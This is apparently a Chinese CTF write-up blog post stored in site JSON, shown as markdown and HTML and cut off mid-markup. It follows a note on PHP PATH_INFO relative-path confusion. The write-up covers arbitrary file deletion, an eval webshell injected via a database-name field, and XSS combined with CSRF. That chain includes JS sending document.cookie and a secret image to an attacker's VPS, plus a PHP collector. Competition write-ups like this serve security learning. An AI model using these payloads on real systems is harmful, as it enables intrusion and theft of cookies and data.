href=\"http://39.107.33.96:20000/index.php/static/js/jquery.min.js\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/static/js/jquery.min.js</a>  找不到<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">##### 当前url: http://39.107.33.96:20000/index.php/view</span><br><span class=\"line\"></span><br><span class=\"line\">html中引入jquery.min.js，采用相对路径:</span><br></pre></td></tr></table></figure></p>\n<p><script src=\"../static/js/jquery.min.js\"></script><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">此时: js的路径:   http://39.107.33.96:20000/static/js/jquery.min.js 可以找到</span><br><span class=\"line\"></span><br><span class=\"line\">#### 注意:http://39.107.33.96:20000/index.php/view/article/1152 可访问</span><br><span class=\"line\"></span><br><span class=\"line\">##### 当前url: http://39.107.33.96:20000/index.php/view/article/1152/..%2f..%2f..%2f..%2findex.php</span><br><span class=\"line\"></span><br><span class=\"line\">对于php而言，它获得的请求是url解码后的，%2F会被解码为/，apache和nginx会按照目录的方式来返回我们请求的资源。</span><br><span class=\"line\">也就是访问</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://39.107.33.96:20000/index.php/view/article/1152/../../../../index.php\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/view/article/1152/../../../../index.php</a><br>=&gt;<br><a href=\"http://39.107.33.96:20000/index.php\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">浏览器在寻找js资源的时候，并没有对%2f进行解码，就认为</span><br><span class=\"line\">..%2f..%2f..%2f..%2findex.php这一坨是一段数据，但是又没有人来接收这段数据，相当于报废。</span><br><span class=\"line\">就好比输入url-https://www.baidu.com?id=1，向百度传递了一个参数id，但它后端没有接收的代码，相当于没有传递</span><br><span class=\"line\"></span><br><span class=\"line\">js的路径：</span><br></pre></td></tr></table></figure></p>\n<p><script src=\"/static/js/jquery.min.js\"></script><br>解析之后:<br><a href=\"http://39.107.33.96:20000/static/js/jquery.min.js\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/static/js/jquery.min.js</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p><script src=\"static/js/jquery.min.js\"></script><br>解析之后:<br><a href=\"http://39.107.33.96:20000/index.php/view/article/1152/static/js/jquery.min.js\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/view/article/1152/static/js/jquery.min.js</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">采用相对路径引入js:</span><br><span class=\"line\">当我们向服务器提交这个请求的时候，服务器会按照phpinfo模式来读取这个url，</span><br><span class=\"line\"></span><br><span class=\"line\">读到..%2f..%2f..%2f..%2findex.php这里就读不下去了，识别不了，退一步，把前面能识别的内容返回回来，也就是http://39.107.33.96:20000/index.php/view/article/1152</span><br><span class=\"line\">也就是url:</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://39.107.33.96:20000/index.php/view/article/1152/static/js/jquery.min.js\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/view/article/1152/static/js/jquery.min.js</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">返回的内容就是:</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://39.107.33.96:20000/index.php/view/article/1152\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/view/article/1152</a><br><code>`</code><br>中返回的内容</p>\n"},{"title":"巅峰极客ctf","date":"2018-07-23T12:33:53.000Z","_content":"\n## pentest\n\n1. 御剑扫描\n\n2. 经过目录扫描，发现`file/file.php`\n\n   根据网页最后提示:\n\n   ```\n   DELETE FILE\n   Sorry,no filename!\n   ```\n\n   可以猜测存在任意文件删除漏洞。\n\n3. 首先我们删除`install.lock`\n\n   ```\n   http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/file/file.php?file=...//config/install.lock\n   ```\n\n4. 重装metinfo，重装的时候数据库名填写 \n\n   ```\n   met#*/@eval($_GET[1]);/*\n   ```\n\n   数据库密码为`root`\n\n5. 执行shell即可\n\n   ```\n   http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/config/config_db.php?1=system(%27ls%27);\n   ```\n\n## mysqlonline\n\n首先通过mysql查询，经过hex编码在输出，可以造成xss。\n\n```\nselect 0x3c7363726970743e616c6572742831293c2f7363726970743e\n```\n\n结合CSRF即可打后台:\n\n```\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"http://106.75.35.230:9001/runsql.php \" method=\"POST\">\n      <input type=\"hidden\" name=\"sql\" value=\"select 0x30783c736372697074207372633d687474703a2f2f69702f7873732f312e6a733e3c2f7363726970743e\" />\n    </form>\n    <script>document.forms[0].submit();</script>\n  </body>\n</html>\n```\n\n```\n0x30783c736372697074207372633d687474703a2f2f69702f7873732f312e6a733e3c2f7363726970743e\n=> \n<script src=http://ip/xss/1.js></script>\n```\n\njs的内容:\n\n```\nself.location = 'http://123.207.90.143/x.php?v=aaa'+btoa(document.cookie)+'aaa';\n```\n\n修改CSRF payload:\n\n```html\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"http://127.0.0.1/runsql.php\" method=\"POST\">\n      <input type=\"hidden\" name=\"sql\" value=\"select 0x30783c736372697074207372633d687474703a2f2f69702f7873732f312e6a733e3c2f7363726970743e\" />\n    </form>\n    <script>document.forms[0].submit();</script>\n  </body>\n</html>\n```\n\n通过以上操作，可以发现后台有`admin_zzzz666.php`页面\n\n但是admin_zzzz666.php并无flag，只有`./static/img/iamsecret_555.jpg `\n\n修改payload,也就是vps上的js文件，利用canvas获取图片:\n\n```\nvar love={ajax:function(){var a;try{a=new XMLHttpRequest()}catch(e){try{a=new ActiveXObject(\"Msxml2.XMLHTTP\")}catch(e){try{a=new ActiveXObject(\"Microsoft.XMLHTTP\")}catch(e){return false}}}return a},req:function(b,c,d,e){d=(d||\"\").toUpperCase();d=d||\"GET\";c=c||\"\";if(b){var a=this.ajax();a.open(d,b,true);if(d==\"POST\"){a.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\")}a.onreadystatechange=function(){if(a.readyState==4){if(e){e(a)}}};if((typeof c)==\"object\"){var f=[];for(var i in c){f.push(i+\"=\"+encodeURIComponent(c[i]))}a.send(f.join(\"&\"))}else{a.send(c||null)}}},get:function(a,b){this.req(a,\"\",\"GET\",b)},post:function(a,b,c){this.req(a,b,\"POST\",c)}};\n\nfunction getBase64(img){\n    function getBase64Image(img,width,height) {//width、height调用时传入具体像素值，控制大小 ,不传则默认图像大小\n        var canvas = document.createElement(\"canvas\");\n        canvas.width = width ? width : img.width;\n        canvas.height = height ? height : img.height;\n\n        var ctx = canvas.getContext(\"2d\");\n        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);\n        var dataURL = canvas.toDataURL();\n        return dataURL;\n    }\n    var image = new Image();\n    image.crossOrigin = '';\n    image.src = img;\n    return new Promise((resolve,reject)=>{\n        image.onload =function (){\n            resolve(getBase64Image(image));//将base64传给done上传处理\n        }\n    });\n}\n\ngetBase64('http://127.0.0.1/static/img/iamsecret_555.jpg').then(base64 => {\n    love.post(\n      \"http://ip/xss/x.php\",\n      \"v=\"+base64,\n      function(res){\n        console.log(res);\n      }\n    );\n}, err => {\n    console.log(err)\n})\n```\n\nvps上xss.php:\n\n```\n<?php\nheader('Access-Control-Allow-Origin: *');\nfile_put_contents('log.txt',$_POST['v']);\n```\n\n最后会获取到图片，当然这个过程中+会被转换为空格，所以后面还要转换回来。 \n\n## Dedefun\n\n```\n参考网址：\nhttps://paper.tuisec.win/detail/d1053143f127862\nhttps://xz.aliyun.com/t/2469#toc-3\n```\n\n**主要用来找后台目录**\n\n## A simple CMS\n\n**利用缓存getshell**\n\n慢慢分析吧。挖坑\n\n\n\n","source":"_posts/巅峰极客ctf.md","raw":"---\ntitle: 巅峰极客ctf\ndate: 2018-07-23 20:33:53\ntags: ctf\n---\n\n## pentest\n\n1. 御剑扫描\n\n2. 经过目录扫描，发现`file/file.php`\n\n   根据网页最后提示:\n\n   ```\n   DELETE FILE\n   Sorry,no filename!\n   ```\n\n   可以猜测存在任意文件删除漏洞。\n\n3. 首先我们删除`install.lock`\n\n   ```\n   http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/file/file.php?file=...//config/install.lock\n   ```\n\n4. 重装metinfo，重装的时候数据库名填写 \n\n   ```\n   met#*/@eval($_GET[1]);/*\n   ```\n\n   数据库密码为`root`\n\n5. 执行shell即可\n\n   ```\n   http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/config/config_db.php?1=system(%27ls%27);\n   ```\n\n## mysqlonline\n\n首先通过mysql查询，经过hex编码在输出，可以造成xss。\n\n```\nselect 0x3c7363726970743e616c6572742831293c2f7363726970743e\n```\n\n结合CSRF即可打后台:\n\n```\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"http://106.75.35.230:9001/runsql.php \" method=\"POST\">\n      <input type=\"hidden\" name=\"sql\" value=\"select 0x30783c736372697074207372633d687474703a2f2f69702f7873732f312e6a733e3c2f7363726970743e\" />\n    </form>\n    <script>document.forms[0].submit();</script>\n  </body>\n</html>\n```\n\n```\n0x30783c736372697074207372633d687474703a2f2f69702f7873732f312e6a733e3c2f7363726970743e\n=> \n<script src=http://ip/xss/1.js></script>\n```\n\njs的内容:\n\n```\nself.location = 'http://123.207.90.143/x.php?v=aaa'+btoa(document.cookie)+'aaa';\n```\n\n修改CSRF payload:\n\n```html\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"http://127.0.0.1/runsql.php\" method=\"POST\">\n      <input type=\"hidden\" name=\"sql\" value=\"select 0x30783c736372697074207372633d687474703a2f2f69702f7873732f312e6a733e3c2f7363726970743e\" />\n    </form>\n    <script>document.forms[0].submit();</script>\n  </body>\n</html>\n```\n\n通过以上操作，可以发现后台有`admin_zzzz666.php`页面\n\n但是admin_zzzz666.php并无flag，只有`./static/img/iamsecret_555.jpg `\n\n修改payload,也就是vps上的js文件，利用canvas获取图片:\n\n```\nvar love={ajax:function(){var a;try{a=new XMLHttpRequest()}catch(e){try{a=new ActiveXObject(\"Msxml2.XMLHTTP\")}catch(e){try{a=new ActiveXObject(\"Microsoft.XMLHTTP\")}catch(e){return false}}}return a},req:function(b,c,d,e){d=(d||\"\").toUpperCase();d=d||\"GET\";c=c||\"\";if(b){var a=this.ajax();a.open(d,b,true);if(d==\"POST\"){a.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\")}a.onreadystatechange=function(){if(a.readyState==4){if(e){e(a)}}};if((typeof c)==\"object\"){var f=[];for(var i in c){f.push(i+\"=\"+encodeURIComponent(c[i]))}a.send(f.join(\"&\"))}else{a.send(c||null)}}},get:function(a,b){this.req(a,\"\",\"GET\",b)},post:function(a,b,c){this.req(a,b,\"POST\",c)}};\n\nfunction getBase64(img){\n    function getBase64Image(img,width,height) {//width、height调用时传入具体像素值，控制大小 ,不传则默认图像大小\n        var canvas = document.createElement(\"canvas\");\n        canvas.width = width ? width : img.width;\n        canvas.height = height ? height : img.height;\n\n        var ctx = canvas.getContext(\"2d\");\n        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);\n        var dataURL = canvas.toDataURL();\n        return dataURL;\n    }\n    var image = new Image();\n    image.crossOrigin = '';\n    image.src = img;\n    return new Promise((resolve,reject)=>{\n        image.onload =function (){\n            resolve(getBase64Image(image));//将base64传给done上传处理\n        }\n    });\n}\n\ngetBase64('http://127.0.0.1/static/img/iamsecret_555.jpg').then(base64 => {\n    love.post(\n      \"http://ip/xss/x.php\",\n      \"v=\"+base64,\n      function(res){\n        console.log(res);\n      }\n    );\n}, err => {\n    console.log(err)\n})\n```\n\nvps上xss.php:\n\n```\n<?php\nheader('Access-Control-Allow-Origin: *');\nfile_put_contents('log.txt',$_POST['v']);\n```\n\n最后会获取到图片，当然这个过程中+会被转换为空格，所以后面还要转换回来。 \n\n## Dedefun\n\n```\n参考网址：\nhttps://paper.tuisec.win/detail/d1053143f127862\nhttps://xz.aliyun.com/t/2469#toc-3\n```\n\n**主要用来找后台目录**\n\n## A simple CMS\n\n**利用缓存getshell**\n\n慢慢分析吧。挖坑\n\n\n\n","slug":"巅峰极客ctf","published":1,"updated":"2018-08-04T08:57:52.898Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12it001xqkdlmfdeh59b","content":"<h2 id=\"pentest\"><a href=\"#pentest\" class=\"headerlink\" title=\"pentest\"></a>pentest</h2><ol>\n<li><p>御剑扫描</p>\n</li>\n<li><p>经过目录扫描，发现<code>file/file.php</code></p>\n<p>根据网页最后提示:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DELETE FILE</span><br><span class=\"line\">Sorry,no filename!</span><br></pre></td></tr></table></figure>\n<p>可以猜测存在任意文件删除漏洞。</p>\n</li>\n<li><p>首先我们删除<code>install.lock</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/file/file.php?file=...//config/install.lock</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>重装metinfo，重装的时候数据库名填写 </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">met#*/@eval($_GET[1]);/*</span><br></pre></td></tr></table></figure>\n<p>数据库密码为<code>root</code></p>\n</li>\n<li><p>执行shell即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/config/config_db.php?1=system(%27ls%27);</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"mysqlonline\"><a href=\"#mysqlonline\" class=\"headerlink\" title=\"mysqlonline\"></a>mysqlonline</h2><p>首先通过mysql查询，经过hex编码在输出，可以造成xss。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 0x3c7363726970743e616c6572742831293c2f7363726970743e</span><br></pre></td></tr></table></figure>\n<p>结合CSRF即可打后台:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">  &lt;body&gt;</span><br><span class=\"line\">  &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt;</span><br><span class=\"line\">    &lt;form action=&quot;http://106.75.35.230:9001/runsql.php &quot; method=&quot;POST&quot;&gt;</span><br><span class=\"line\">      &lt;input type=&quot;hidden&quot; name=&quot;sql&quot; value=&quot;select 0x30783c736372697074207372633d687474703a2f2f69702f7873732f312e6a733e3c2f7363726970743e&quot; /&gt;</span><br><span class=\"line\">    &lt;/form&gt;</span><br><span class=\"line\">    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;</span><br><span class=\"line\">  &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x30783c736372697074207372633d687474703a2f2f69702f7873732f312e6a733e3c2f7363726970743e</span><br><span class=\"line\">=&gt; </span><br><span class=\"line\">&lt;script src=http://ip/xss/1.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>js的内容:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">self.location = &apos;http://123.207.90.143/x.php?v=aaa&apos;+btoa(document.cookie)+&apos;aaa&apos;;</span><br></pre></td></tr></table></figure>\n<p>修改CSRF payload:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">history.pushState(<span class=\"string\">''</span>, <span class=\"string\">''</span>, <span class=\"string\">'/'</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"http://127.0.0.1/runsql.php\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"POST\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"sql\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"select 0x30783c736372697074207372633d687474703a2f2f69702f7873732f312e6a733e3c2f7363726970743e\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"><span class=\"built_in\">document</span>.forms[<span class=\"number\">0</span>].submit();</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>通过以上操作，可以发现后台有<code>admin_zzzz666.php</code>页面</p>\n<p>但是admin_zzzz666.php并无flag，只有<code>./static/img/iamsecret_555.jpg</code></p>\n<p>修改payload,也就是vps上的js文件，利用canvas获取图片:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var love=&#123;ajax:function()&#123;var a;try&#123;a=new XMLHttpRequest()&#125;catch(e)&#123;try&#123;a=new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;)&#125;catch(e)&#123;try&#123;a=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;)&#125;catch(e)&#123;return false&#125;&#125;&#125;return a&#125;,req:function(b,c,d,e)&#123;d=(d||&quot;&quot;).toUpperCase();d=d||&quot;GET&quot;;c=c||&quot;&quot;;if(b)&#123;var a=this.ajax();a.open(d,b,true);if(d==&quot;POST&quot;)&#123;a.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;)&#125;a.onreadystatechange=function()&#123;if(a.readyState==4)&#123;if(e)&#123;e(a)&#125;&#125;&#125;;if((typeof c)==&quot;object&quot;)&#123;var f=[];for(var i in c)&#123;f.push(i+&quot;=&quot;+encodeURIComponent(c[i]))&#125;a.send(f.join(&quot;&amp;&quot;))&#125;else&#123;a.send(c||null)&#125;&#125;&#125;,get:function(a,b)&#123;this.req(a,&quot;&quot;,&quot;GET&quot;,b)&#125;,post:function(a,b,c)&#123;this.req(a,b,&quot;POST&quot;,c)&#125;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">function getBase64(img)&#123;</span><br><span class=\"line\">    function getBase64Image(img,width,height) &#123;//width、height调用时传入具体像素值，控制大小 ,不传则默认图像大小</span><br><span class=\"line\">        var canvas = document.createElement(&quot;canvas&quot;);</span><br><span class=\"line\">        canvas.width = width ? width : img.width;</span><br><span class=\"line\">        canvas.height = height ? height : img.height;</span><br><span class=\"line\"></span><br><span class=\"line\">        var ctx = canvas.getContext(&quot;2d&quot;);</span><br><span class=\"line\">        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);</span><br><span class=\"line\">        var dataURL = canvas.toDataURL();</span><br><span class=\"line\">        return dataURL;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    var image = new Image();</span><br><span class=\"line\">    image.crossOrigin = &apos;&apos;;</span><br><span class=\"line\">    image.src = img;</span><br><span class=\"line\">    return new Promise((resolve,reject)=&gt;&#123;</span><br><span class=\"line\">        image.onload =function ()&#123;</span><br><span class=\"line\">            resolve(getBase64Image(image));//将base64传给done上传处理</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">getBase64(&apos;http://127.0.0.1/static/img/iamsecret_555.jpg&apos;).then(base64 =&gt; &#123;</span><br><span class=\"line\">    love.post(</span><br><span class=\"line\">      &quot;http://ip/xss/x.php&quot;,</span><br><span class=\"line\">      &quot;v=&quot;+base64,</span><br><span class=\"line\">      function(res)&#123;</span><br><span class=\"line\">        console.log(res);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    );</span><br><span class=\"line\">&#125;, err =&gt; &#123;</span><br><span class=\"line\">    console.log(err)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p>vps上xss.php:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">header(&apos;Access-Control-Allow-Origin: *&apos;);</span><br><span class=\"line\">file_put_contents(&apos;log.txt&apos;,$_POST[&apos;v&apos;]);</span><br></pre></td></tr></table></figure>\n<p>最后会获取到图片，当然这个过程中+会被转换为空格，所以后面还要转换回来。 </p>\n<h2 id=\"Dedefun\"><a href=\"#Dedefun\" class=\"headerlink\" title=\"Dedefun\"></a>Dedefun</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">参考网址：</span><br><span class=\"line\">https://paper.tuisec.win/detail/d1053143f127862</span><br><span class=\"line\">https://xz.aliyun.com/t/2469#toc-3</span><br></pre></td></tr></table></figure>\n<p><strong>主要用来找后台目录</strong></p>\n<h2 id=\"A-simple-CMS\"><a href=\"#A-simple-CMS\" class=\"headerlink\" title=\"A simple CMS\"></a>A simple CMS</h2><p><strong>利用缓存getshell</strong></p>\n<p>慢慢分析吧。挖坑</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"pentest\"><a href=\"#pentest\" class=\"headerlink\" title=\"pentest\"></a>pentest</h2><ol>\n<li><p>御剑扫描</p>\n</li>\n<li><p>经过目录扫描，发现<code>file/file.php</code></p>\n<p>根据网页最后提示:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DELETE FILE</span><br><span class=\"line\">Sorry,no filename!</span><br></pre></td></tr></table></figure>\n<p>可以猜测存在任意文件删除漏洞。</p>\n</li>\n<li><p>首先我们删除<code>install.lock</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/file/file.php?file=...//config/install.lock</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>重装metinfo，重装的时候数据库名填写 </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">met#*/@eval($_GET[1]);/*</span><br></pre></td></tr></table></figure>\n<p>数据库密码为<code>root</code></p>\n</li>\n<li><p>执行shell即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/config/config_db.php?1=system(%27ls%27);</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"mysqlonline\"><a href=\"#mysqlonline\" class=\"headerlink\" title=\"mysqlonline\"></a>mysqlonline</h2><p>首先通过mysql查询，经过hex编码在输出，可以造成xss。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 0x3c7363726970743e616c6572742831293c2f7363726970743e</span><br></pre></td></tr></table></figure>\n<p>结合CSRF即可打后台:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">  &lt;body&gt;</span><br><span class=\"line\">  &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt;</span><br><span class=\"line\">    &lt;form action=&quot;http://106.75.35.230:9001/runsql.php &quot; method=&quot;POST&quot;&gt;</span><br><span class=\"line\">      &lt;input type=&quot;hidden&quot; name=&quot;sql&quot; value=&quot;select 0x30783c736372697074207372633d687474703a2f2f69702f7873732f312e6a733e3c2f7363726970743e&quot; /&gt;</span><br><span class=\"line\">    &lt;/form&gt;</span><br><span class=\"line\">    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;</span><br><span class=\"line\">  &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x30783c736372697074207372633d687474703a2f2f69702f7873732f312e6a733e3c2f7363726970743e</span><br><span class=\"line\">=&gt; </span><br><span class=\"line\">&lt;script src=http://ip/xss/1.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>js的内容:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">self.location = &apos;http://123.207.90.143/x.php?v=aaa&apos;+btoa(document.cookie)+&apos;aaa&apos;;</span><br></pre></td></tr></table></figure>\n<p>修改CSRF payload:</p>\n<figure class=\"highlight html\"><table><tr><td 